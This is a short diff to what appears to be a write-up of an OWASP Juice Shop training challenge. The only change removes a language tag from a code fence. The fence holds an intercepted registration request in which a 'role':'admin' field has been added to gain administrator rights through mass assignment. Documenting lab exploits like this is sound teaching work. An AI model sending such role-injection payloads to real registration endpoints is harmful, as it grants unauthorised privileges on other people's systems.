@@ -12,7 +12,7 @@ Added a `role` field to the intercepted JSON body before forwarding:
 
 Full modified body:
 
-```json
+```
 {"email":"hacker@juice-sh.op","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"...","updatedAt":"..."},"securityAnswer":"smaug","role":"admin"}
 ```
 
